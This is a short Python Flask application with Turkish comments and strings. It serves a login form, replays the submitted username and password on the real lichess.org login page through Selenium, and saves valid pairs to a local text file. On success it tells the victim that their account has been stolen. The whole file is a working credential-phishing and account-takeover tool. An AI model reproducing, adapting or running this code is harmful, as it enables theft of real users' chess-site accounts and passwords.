from flask import *
from selenium import webdriver
from selenium.webdriver.common.by import By
import time


#Before run pls do this pip install flask , pip install selenium

app = Flask(__name__)

@app.route("/",methods=["GET","POST"])
def index():
    if request.method == "POST":
        isim = request.form.get("username")
        sifre = request.form.get("password")

        url = "https://lichess.org/login?referrer=/login"

        browser = webdriver.Edge()
        browser.get(url)
        

        isimgir = browser.find_element(By.XPATH,'//*[@id="form3-username"]')
        isimgir.send_keys(isim)

        sifregir = browser.find_element(By.XPATH,'//*[@id="form3-password"]')

        sifregir.send_keys(sifre)

        tikla = browser.find_element(By.XPATH,'//*[@id="main-wrap"]/main/form/div[1]/button')

        tikla.click()
        time.sleep(2)
        time.sleep(2)

        try:
            yeni = browser.find_element(By.XPATH,'//*[@id="form3-username"]')
            yeni.send_keys("hahahah")
            sonuc = "Hatalı kullanıcı adı ya da şifre"
        except:
            dosya = open("sifre.txt","a+")
            dosya.write("İsim:"+isim)
            dosya.write("\n")
            dosya.write("Şifre:"+sifre)
            dosya.write("\n")
            dosya.close()
            sonuc = "Giris basarılı hesabınız calınmıstır"


        return render_template("index.html",sonuc=sonuc)
    else:
        return render_template("index.html")



if __name__ == ("__main__"):
    app.run(debug=True)